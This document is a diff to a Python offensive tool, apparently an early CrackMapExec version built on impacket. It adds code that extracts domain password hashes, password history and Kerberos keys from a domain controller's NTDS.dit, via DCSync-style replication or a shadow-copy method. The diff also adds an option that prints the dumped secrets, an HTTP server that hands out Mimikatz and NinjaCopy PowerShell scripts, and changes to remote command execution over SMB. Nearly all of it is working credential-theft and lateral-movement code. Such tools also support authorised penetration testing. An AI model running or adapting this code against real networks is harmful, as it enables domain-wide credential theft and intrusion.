@@ -11,12 +11,14 @@ from netaddr import IPNetwork, IPRange, IPAddress
 from threading import Thread
 from base64 import b64encode
 from struct import unpack, pack
+from collections import OrderedDict
 from impacket import smbserver, ntlm, winregistry
-from impacket.dcerpc.v5 import transport, scmr, samr, drsuapi, rrp, tsch, srvs, wkst
+from impacket.dcerpc.v5 import transport, scmr, samr, drsuapi, rrp, tsch, srvs, wkst, epm
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
 from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dtypes import NULL, OWNER_SECURITY_INFORMATION
-from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
+from impacket.ese import ESENT_DB
 from impacket.structure import Structure
 from impacket.nt_errors import STATUS_MORE_ENTRIES
 from impacket.smbconnection import *
@@ -34,8 +36,8 @@ import hashlib
 import BaseHTTPServer
 import logging
 import argparse
-import ConfigParser
 import traceback
+import ConfigParser
 import random
 import sys
 import os
@@ -174,7 +176,13 @@ class MimikatzServer(BaseHTTPRequestHandler):
         if self.path == "/Invoke-Mimikatz.ps1":
             self.send_response(200)
             self.end_headers()
-            with open('Invoke-Mimikatz.ps1', 'r') as script:
+            with open('served_over_http/Invoke-Mimikatz.ps1', 'r') as script:
+                self.wfile.write(script.read())
+
+        elif self.path == "/Invoke-NinjaCopy.ps1":
+            self.send_response(200)
+            self.end_headers()
+            with open('served_over_http/Invoke-NinjaCopy.ps1', 'r') as script:
                 self.wfile.write(script.read())
         else:
             self.send_response(404)
@@ -945,17 +953,514 @@ class RemoteOperations:
 
         return remoteFileName
 
+class NTDSHashes:
+    NAME_TO_INTERNAL = {
+        'uSNCreated':'ATTq131091',
+        'uSNChanged':'ATTq131192',
+        'name':'ATTm3',
+        'objectGUID':'ATTk589826',
+        'objectSid':'ATTr589970',
+        'userAccountControl':'ATTj589832',
+        'primaryGroupID':'ATTj589922',
+        'accountExpires':'ATTq589983',
+        'logonCount':'ATTj589993',
+        'sAMAccountName':'ATTm590045',
+        'sAMAccountType':'ATTj590126',
+        'lastLogonTimestamp':'ATTq589876',
+        'userPrincipalName':'ATTm590480',
+        'unicodePwd':'ATTk589914',
+        'dBCSPwd':'ATTk589879',
+        'ntPwdHistory':'ATTk589918',
+        'lmPwdHistory':'ATTk589984',
+        'pekList':'ATTk590689',
+        'supplementalCredentials':'ATTk589949',
+    }
+
+    NAME_TO_ATTRTYP = {
+        'userPrincipalName': 0x90290,
+        'sAMAccountName': 0x900DD,
+        'unicodePwd': 0x9005A,
+        'dBCSPwd': 0x90037,
+        'ntPwdHistory': 0x9005E,
+        'lmPwdHistory': 0x900A0,
+        'supplementalCredentials': 0x9007D,
+        'objectSid': 0x90092,
+    }
+
+    KERBEROS_TYPE = {
+        1:'dec-cbc-crc',
+        3:'des-cbc-md5',
+        17:'aes128-cts-hmac-sha1-96',
+        18:'aes256-cts-hmac-sha1-96',
+        0xffffff74:'rc4_hmac',
+    }
+
+    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())
+
+    SAM_NORMAL_USER_ACCOUNT = 0x30000000
+    SAM_MACHINE_ACCOUNT     = 0x30000001
+    SAM_TRUST_ACCOUNT       = 0x30000002
+
+    ACCOUNT_TYPES = ( SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)
+
+    class PEK_KEY(Structure):
+        structure = (
+            ('Header','8s=""'),
+            ('KeyMaterial','16s=""'),
+            ('EncryptedPek','52s=""'),
+        )
+
+    class CRYPTED_HASH(Structure):
+        structure = (
+            ('Header','8s=""'),
+            ('KeyMaterial','16s=""'),
+            ('EncryptedHash','16s=""'),
+        )
+
+    class CRYPTED_HISTORY(Structure):
+        structure = (
+            ('Header','8s=""'),
+            ('KeyMaterial','16s=""'),
+            ('EncryptedHash',':'),
+        )
+
+    class CRYPTED_BLOB(Structure):
+        structure = (
+            ('Header','8s=""'),
+            ('KeyMaterial','16s=""'),
+            ('EncryptedHash',':'),
+        )
+
+    def __init__(self, ntdsFile, bootKey, noLMHash=True, remoteOps=None, useVSSMethod=False):
+        self.__bootKey = bootKey
+        self.__NTDS = ntdsFile
+        self.__history = False
+        self.__noLMHash = noLMHash
+        self.__useVSSMethod = useVSSMethod
+        self.dumped_hashes = {'hashes': [], 'kerb': []}
+        self.__remoteOps = remoteOps
+        if self.__NTDS is not None:
+            self.__ESEDB = ESENT_DB(ntdsFile, isRemote = True)
+            self.__cursor = self.__ESEDB.openTable('datatable')
+        self.__tmpUsers = list()
+        self.__PEK = None
+        self.__cryptoCommon = CryptoCommon()
+        self.__hashesFound = {}
+        self.__kerberosKeys = OrderedDict()
+
+    def __getPek(self):
+        logging.info('Searching for pekList, be patient')
+        pek = None
+        while True:
+            record = self.__ESEDB.getNextRow(self.__cursor)
+            if record is None:
+                break
+            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
+                pek =  unhexlify(record[self.NAME_TO_INTERNAL['pekList']])
+                break
+            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
+                # Okey.. we found some users, but we're not yet ready to process them.
+                # Let's just store them in a temp list
+                self.__tmpUsers.append(record)
+
+        if pek is not None:
+            encryptedPek = self.PEK_KEY(pek)
+            md5 = hashlib.new('md5')
+            md5.update(self.__bootKey)
+            for i in range(1000):
+                md5.update(encryptedPek['KeyMaterial'])
+            tmpKey = md5.digest()
+            rc4 = ARC4.new(tmpKey)
+            plainText = rc4.encrypt(encryptedPek['EncryptedPek'])
+            self.__PEK = plainText[36:]
+
+    def __removeRC4Layer(self, cryptedHash):
+        md5 = hashlib.new('md5')
+        md5.update(self.__PEK)
+        md5.update(cryptedHash['KeyMaterial'])
+        tmpKey = md5.digest()
+        rc4 = ARC4.new(tmpKey)
+        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])
+
+        return plainText
+
+    def __removeDESLayer(self, cryptedHash, rid):
+        Key1,Key2 = self.__cryptoCommon.deriveKey(int(rid))
+
+        Crypt1 = DES.new(Key1, DES.MODE_ECB)
+        Crypt2 = DES.new(Key2, DES.MODE_ECB)
+
+        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])
+
+        return decryptedHash
+
+    def __decryptSupplementalInfo(self, record, rid=None):
+        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
+        haveInfo = False
+        if self.__useVSSMethod is True:
+            if record[self.NAME_TO_INTERNAL['supplementalCredentials']] is not None:
+                if len(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']])) > 24:
+                    if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
+                        domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
+                        userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
+                    else:
+                        userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
+                    cipherText = self.CRYPTED_BLOB(unhexlify(record[self.NAME_TO_INTERNAL['supplementalCredentials']]))
+                    plainText = self.__removeRC4Layer(cipherText)
+                    haveInfo = True
+        else:
+            domain = None
+            userName = None
+            for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
+                if attr['attrTyp'] == self.NAME_TO_ATTRTYP['userPrincipalName']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        try:
+                            domain = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
+                        except:
+                            domain = None
+                    else:
+                        domain = None
+                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['sAMAccountName']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        try:
+                            userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
+                        except:
+                            logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+                            userName = 'unknown'
+                    else:
+                        logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+                        userName = 'unknown'
+                if attr['attrTyp'] == self.NAME_TO_ATTRTYP['supplementalCredentials']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        blob = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                        plainText = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), blob)
+                        if len(plainText) > 24:
+                            haveInfo = True
+            if domain is not None:
+                userName = '%s\\%s' % (domain, userName)
+
+        if haveInfo is True:
+            try:
+                userProperties = samr.USER_PROPERTIES(plainText)
+            except:
+                # On some old w2k3 there might be user properties that don't
+                # match [MS-SAMR] structure, discarding them
+                return
+            propertiesData = userProperties['UserProperties']
+            for propertyCount in range(userProperties['PropertyCount']):
+                userProperty = samr.USER_PROPERTY(propertiesData)
+                propertiesData = propertiesData[len(userProperty):]
+                # For now, we will only process Newer Kerberos Keys.
+                if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
+                    propertyValueBuffer = unhexlify(userProperty['PropertyValue'])
+                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
+                    data = kerbStoredCredentialNew['Buffer']
+                    for credential in range(kerbStoredCredentialNew['CredentialCount']):
+                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
+                        data = data[len(keyDataNew):]
+                        keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]
+
+                        if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
+                            answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],hexlify(keyValue))
+                        else:
+                            answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),hexlify(keyValue))
+                        # We're just storing the keys, not printing them, to make the output more readable
+                        # This is kind of ugly... but it's what I came up with tonight to get an ordered
+                        # set :P. Better ideas welcomed ;)
+                        self.__kerberosKeys[answer] = None
+
+    def __decryptHash(self, record, rid=None):
+        if self.__useVSSMethod is True:
+            logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])
+
+            sid = SAMR_RPC_SID(unhexlify(record[self.NAME_TO_INTERNAL['objectSid']]))
+            rid = sid.formatCanonical().split('-')[-1]
+
+            if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
+                encryptedLMHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['dBCSPwd']]))
+                tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
+                LMHash = self.__removeDESLayer(tmpLMHash, rid)
+            else:
+                LMHash = ntlm.LMOWFv1('', '')
+
+            if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
+                encryptedNTHash = self.CRYPTED_HASH(unhexlify(record[self.NAME_TO_INTERNAL['unicodePwd']]))
+                tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
+                NTHash = self.__removeDESLayer(tmpNTHash, rid)
+            else:
+                NTHash = ntlm.NTOWFv1('', '')
+
+            if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
+                domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
+                userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
+            else:
+                userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
+
+            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
+            self.__hashesFound[unhexlify(record[self.NAME_TO_INTERNAL['objectSid']])] = answer
+            self.dumped_hashes['hashes'].append(answer)
+
+            if self.__history:
+                LMHistory = []
+                NTHistory = []
+                if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
+                    encryptedLMHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['lmPwdHistory']]))
+                    tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
+                    for i in range(0, len(tmpLMHistory) / 16):
+                        LMHash = self.__removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
+                        LMHistory.append(LMHash)
+
+                if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
+                    encryptedNTHistory = self.CRYPTED_HISTORY(unhexlify(record[self.NAME_TO_INTERNAL['ntPwdHistory']]))
+                    tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
+                    for i in range(0, len(tmpNTHistory) / 16):
+                        NTHash = self.__removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
+                        NTHistory.append(NTHash)
+
+                for i, (LMHash, NTHash) in enumerate(
+                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
+                    if self.__noLMHash:
+                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
+                    else:
+                        lmhash = hexlify(LMHash)
+
+                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHash))
+                    self.__hashesFound[unhexlify(record[self.NAME_TO_INTERNAL['objectSid']]) + str(i)] = answer
+                    self.dumped_hashes['hashes'].append(answer)
+        else:
+            logging.debug('Decrypting hash for user: %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+            domain = None
+            if self.__history:
+                LMHistory = []
+                NTHistory = []
+            for attr in record['pmsgOut']['V6']['pObjects']['Entinf']['AttrBlock']['pAttr']:
+                if attr['attrTyp'] == self.NAME_TO_ATTRTYP['dBCSPwd']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        encrypteddBCSPwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                        encryptedLMHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encrypteddBCSPwd)
+                        LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
+                    else:
+                        LMHash = ntlm.LMOWFv1('', '')
+                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['unicodePwd']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        encryptedUnicodePwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                        encryptedNTHash = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedUnicodePwd)
+                        NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
+                    else:
+                        NTHash = ntlm.NTOWFv1('', '')
+                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['userPrincipalName']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        try:
+                            domain = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
+                        except:
+                            domain = None
+                    else:
+                        domain = None
+                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['sAMAccountName']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        try:
+                            userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
+                        except:
+                            logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+                            userName = 'unknown'
+                    else:
+                        logging.error('Cannot get sAMAccountName for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+                        userName = 'unknown'
+                elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['objectSid']:
+                    if attr['AttrVal']['valCount'] > 0:
+                        objectSid = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                    else:
+                        logging.error('Cannot get objectSid for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+                        objectSid = rid
+
+                if self.__history:
+                    if attr['attrTyp'] == self.NAME_TO_ATTRTYP['lmPwdHistory']:
+                        if attr['AttrVal']['valCount'] > 0:
+                            encryptedLMHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                            tmpLMHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedLMHistory)
+                            for i in range(0, len(tmpLMHistory) / 16):
+                                LMHashHistory = drsuapi.removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
+                                LMHistory.append(LMHashHistory)
+                        else:
+                            logging.debug('No lmPwdHistory for user %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+                    elif attr['attrTyp'] == self.NAME_TO_ATTRTYP['ntPwdHistory']:
+                        if attr['AttrVal']['valCount'] > 0:
+                            encryptedNTHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                            tmpNTHistory = drsuapi.DecryptAttributeValue(self.__remoteOps.getDrsr(), encryptedNTHistory)
+                            for i in range(0, len(tmpNTHistory) / 16):
+                                NTHashHistory = drsuapi.removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
+                                NTHistory.append(NTHashHistory)
+                        else:
+                            logging.debug('No ntPwdHistory for user %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
+
+            if domain is not None:
+                userName = '%s\\%s' % (domain, userName)
+
+            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
+            self.__hashesFound[objectSid] = answer
+            self.dumped_hashes['hashes'].append(answer)
+
+            if self.__history:
+                for i, (LMHashHistory, NTHashHistory) in enumerate(
+                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
+                    if self.__noLMHash:
+                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
+                    else:
+                        lmhash = hexlify(LMHashHistory)
+
+                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
+                    self.__hashesFound[objectSid + str(i)] = answer
+                    print answer
+
+    def dump(self):
+        if self.__NTDS is None and self.__useVSSMethod is True:
+            # No NTDS.dit file provided and were asked to use VSS
+            return
+        else:
+            try:
+                self.__remoteOps.connectSamr(self.__remoteOps.getMachineNameAndDomain()[1])
+            except:
+                # Target's not a DC
+                return
+
+        logging.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
+        if self.__useVSSMethod:
+            # We start getting rows from the table aiming at reaching
+            # the pekList. If we find users records we stored them
+            # in a temp list for later process.
+            self.__getPek()
+            if self.__PEK is not None:
+                logging.info('Pek found and decrypted: 0x%s' % hexlify(self.__PEK))
+                logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
+                # First of all, if we have users already cached, let's decrypt their hashes
+                for record in self.__tmpUsers:
+                    try:
+                        self.__decryptHash(record)
+                        self.__decryptSupplementalInfo(record)
+                    except Exception, e:
+                        # import traceback
+                        # print traceback.print_exc()
+                        try:
+                            logging.error(
+                                "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
+                            logging.error(str(e))
+                            pass
+                        except:
+                            logging.error("Error while processing row!")
+                            logging.error(str(e))
+                            pass
+
+                # Now let's keep moving through the NTDS file and decrypting what we find
+                while True:
+                    try:
+                        record = self.__ESEDB.getNextRow(self.__cursor)
+                    except:
+                        logging.error('Error while calling getNextRow(), trying the next one')
+                        continue
+
+                    if record is None:
+                        break
+                    try:
+                        if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
+                            self.__decryptHash(record)
+                            self.__decryptSupplementalInfo(record)
+                    except Exception, e:
+                        # import traceback
+                        # print traceback.print_exc()
+                        try:
+                            logging.error(
+                                "Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
+                            logging.error(str(e))
+                            pass
+                        except:
+                            logging.error("Error while processing row!")
+                            logging.error(str(e))
+                            pass
+        else:
+            logging.info('Using the DRSUAPI method to get NTDS.DIT secrets')
+            status = STATUS_MORE_ENTRIES
+            enumerationContext = 0
+            while status == STATUS_MORE_ENTRIES:
+                resp = self.__remoteOps.getDomainUsers(enumerationContext)
+
+                for user in resp['Buffer']['Buffer']:
+                    userName = user['Name']
+
+                    # Let's crack the user name into DS_FQDN_1779_NAME
+                    crackedName = self.__remoteOps.DRSCrackNames(drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, name = userName)
+
+                    if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
+                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+                        #userRecord.dump()
+                        if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
+                            raise Exception('DRSGetNCChanges didn\'t return any object!')
+                    else:
+                        logging.warning('DRSCrackNames returned %d items for user %s, skipping' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
+                    try:
+                        self.__decryptHash(userRecord, user['RelativeId'])
+                        self.__decryptSupplementalInfo(userRecord, user['RelativeId'])
+                    except Exception, e:
+                        #import traceback
+                        #traceback.print_exc()
+                        logging.error("Error while processing user!")
+                        logging.error(str(e))
+
+                enumerationContext = resp['EnumerationContext']
+                status = resp['ErrorCode']
+
+        # Now we'll print the Kerberos keys. So we don't mix things up in the output.
+        if len(self.__kerberosKeys) > 0:
+            if self.__useVSSMethod is True:
+                logging.info('Kerberos keys from %s ' % self.__NTDS)
+            else:
+                logging.info('Kerberos keys grabbed')
+
+            for itemKey in self.__kerberosKeys.keys():
+                self.dumped_hashes['kerb'].append(itemKey)
+
+        return self.dumped_hashes
+
+    def export(self, fileName):
+        if len(self.__hashesFound) > 0:
+            items = sorted(self.__hashesFound)
+            fd = open(fileName+'.ntds','w+')
+            for item in items:
+                try:
+                    fd.write(self.__hashesFound[item]+'\n')
+                except:
+                    try:
+                        logging.error("Error writing entry %d, skipping" % item)
+                    except:
+                        logging.error("Error writing entry, skipping")
+                    pass
+            fd.close()
+        if len(self.__kerberosKeys) > 0:
+            fd = open(fileName+'.ntds.kerberos','w+')
+            for itemKey in self.__kerberosKeys.keys():
+                fd.write(itemKey+'\n')
+            fd.close()
+
+    def finish(self):
+        if self.__NTDS is not None:
+            self.__ESEDB.close()
+
 class DumpSecrets:
-    def __init__(self, address, username='', password='', domain='', hashes=None):
+    def __init__(self, address, smbConnection, username='', password='', domain='', hashes=None, sam=False, ntds=False, useVSSMethod=False):
         self.__remoteAddr = address
         self.__username = username
         self.__password = password
         self.__domain = domain
+        self.__smbConnection = smbConnection
         self.__lmhash = ''
         self.__nthash = ''
+        self.__sam = sam
+        self.__ntds = ntds
+        self.__useVSSMethod = useVSSMethod
         self.__remoteOps = None
         self.__SAMHashes = None
         self.__isRemote = True
+        self.dumped_ntds_hashes = None
+        self.dumped_sam_hashes = None
         if hashes:
             self.__lmhash, self.__nthash = hashes.split(':')
 
@@ -1004,23 +1509,36 @@ class DumpSecrets:
         log.debug('LMHashes are NOT being stored')
         return True
 
-    def dump(self, smbConnection):
+    def dump(self):
         try:
-            self.__remoteOps = RemoteOperations(smbConnection)
+            self.__remoteOps = RemoteOperations(self.__smbConnection)
             self.__remoteOps.enableRegistry()
             bootKey = self.__remoteOps.getBootKey()
 
             # Let's check whether target system stores LM Hashes
             self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
 
-            SAMFileName = self.__remoteOps.saveSAM()
+            if self.__sam is True:
+                SAMFileName = self.__remoteOps.saveSAM()
 
-            self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
-            sam_hashes = self.__SAMHashes.dump()
+                self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
+                self.dumped_sam_hashes = self.__SAMHashes.dump()
 
-            SECURITYFileName = self.__remoteOps.saveSECURITY()
+                SECURITYFileName = self.__remoteOps.saveSECURITY()
 
-            return sam_hashes
+            elif self.__ntds is True:
+                if self.__useVSSMethod:
+                    NTDSFileName = self.__remoteOps.saveNTDS()
+                else:
+                    NTDSFileName = None
+
+                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, noLMHash=self.__noLMHash, remoteOps=self.__remoteOps, useVSSMethod=self.__useVSSMethod)
+                try:
+                    self.dumped_ntds_hashes = self.__NTDSHashes.dump()
+                except Exception, e:
+                    logging.error(e)
+                    if self.__useVSSMethod is False:
+                        logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
 
         except (Exception, KeyboardInterrupt), e:
             log.error(e)
@@ -1035,6 +1553,8 @@ class DumpSecrets:
             self.__remoteOps.finish()
         if self.__SAMHashes:
             self.__SAMHashes.finish()
+        if self.__NTDSHashes:
+            self.__NTDSHashes.finish()
 
 class ListUsersException(Exception):
     pass
@@ -1341,11 +1861,7 @@ class RemoteShellsmbexec():
         self.__rpc = rpc
         self.__scmr = rpc.get_dce_rpc()
 
-        try:
-            self.__scmr.connect()
-        except Exception as e:
-            print "[!] {}".format(e)
-            sys.exit(1)
+        self.__scmr.connect()
 
         s = rpc.get_smb_connection()
 
@@ -1355,13 +1871,10 @@ class RemoteShellsmbexec():
             myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
             self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
 
-        try:
-            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
-            resp = scmr.hROpenSCManagerW(self.__scmr)
-            self.__scHandle = resp['lpScHandle']
-            self.transferClient = rpc.get_smb_connection()
-        except Exception as e:
-            print "[-] {}".format(e)
+        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+        resp = scmr.hROpenSCManagerW(self.__scmr)
+        self.__scHandle = resp['lpScHandle']
+        self.transferClient = rpc.get_smb_connection()
 
     def set_copyback(self):
         s = self.__rpc.get_smb_connection()
@@ -1506,7 +2019,6 @@ class CMDEXEC:
                     smb_server.stop()
 
             except  (Exception, KeyboardInterrupt), e:
-                traceback.print_exc()
                 self.shell.finish()
                 sys.stdout.flush()
                 sys.exit(1)
@@ -1769,10 +2281,18 @@ def connect(host):
                 pass
 
         domain = smb.getServerDomain()
+        s_name = smb.getServerName()
         if not domain:
-            domain = smb.getServerName()
+            domain = s_name
 
-        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
+        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), s_name, domain)
+
+        #DC's seem to want us to logoff first
+        #Workstations sometimes reset the connection, so we handle that here
+        try:
+            smb.logoff()
+        except socket.error:
+            smb = SMBConnection(host, host, None, args.port)
 
         if args.user is not None and (args.passwd is not None or args.hash is not None):
             lmhash = ''
@@ -1814,14 +2334,14 @@ def connect(host):
 
             if args.spider:
                 start_time = time()
-                print "[+] {}:{} {} Started spidering".format(host, args.port, domain)
+                print "[+] {}:{} {} Started spidering".format(host, args.port, s_name)
                 spider(smb, host, args.share, args.spider, args.pattern, args.depth)
-                print "[+] {}:{} {} Done spidering (Completed in {})".format(host, args.port, domain, time() - start_time)
+                print "[+] {}:{} {} Done spidering (Completed in {})".format(host, args.port, s_name, time() - start_time)
 
             if args.enum_sessions:
                 rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
                 sessions = rpcenum.enum_sessions(host)
-                print "[+] {}:{} {} Current active sessions:".format(host, args.port, domain)
+                print "[+] {}:{} {} Current active sessions:".format(host, args.port, s_name)
                 for session in sessions:
                     for fname in session.fields.keys():
                         print fname, session[fname]
@@ -1830,23 +2350,39 @@ def connect(host):
             if args.enum_lusers:
                 rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
                 lusers = rpcenum.enum_logged_on_users(host)
-                print "[+] {}:{} {} Logged on users:".format(host, args.port, domain)
+                print "[+] {}:{} {} Logged on users:".format(host, args.port, s_name)
                 for luser in lusers:
                     for fname in luser.fields.keys():
                         print fname, luser[fname]
                     print "\n"
 
             if args.sam:
-                sec_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash)
-                sam_dump = sec_dump.dump(smb)
-                print "[+] {}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, domain)
-                for sam_hash in sam_dump:
-                    print sam_hash
-                sec_dump.cleanup()
+                sam_dump = DumpSecrets(host, smb, args.user, args.passwd, domain, args.hash, True)
+                sam_dump.dump()
+                if sam_dump.dumped_sam_hashes:
+                    print "[+] {}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, s_name)
+                    for sam_hash in sam_dump.dumped_sam_hashes:
+                        print sam_hash
+                sam_dump.cleanup()
+
+            if args.ntds:
+                vss = False
+                if args.ntds == 'vss': vss = True
+
+                ntds_dump = DumpSecrets(host, smb, args.user, args.passwd, domain, args.hash, False, True, vss)
+                ntds_dump.dump()
+                if ntds_dump.dumped_ntds_hashes:
+                    print "[+] {}:{} {} Dumping NTDS.dit secrets using the {} method (domain\uid:rid:lmhash:nthash):".format(host, args.port, s_name, args.ntds.upper())
+                    for h in ntds_dump.dumped_ntds_hashes['hashes']:
+                        print h
+                    print "[+] {}:{} {} Kerberos keys grabbed:".format(host, args.port, s_name)
+                    for h in ntds_dump.dumped_ntds_hashes['kerb']:
+                        print h
+                ntds_dump.cleanup()
 
             if args.enum_users:
                 user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash).dump(host)
-                print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, domain, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
+                print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, s_name, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
 
             if args.mimikatz:
                 noOutput = True
@@ -1862,28 +2398,28 @@ def connect(host):
                     executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, domain, args.hash, args.share, args.command, noOutput)
                     result = executer.run(host)
                     if result:
-                        print '[+] {}:{} {} Executed specified command via SMBEXEC'.format(host, args.port, domain)
+                        print '[+] {}:{} {} Executed specified command via SMBEXEC'.format(host, args.port, s_name)
                         print result
 
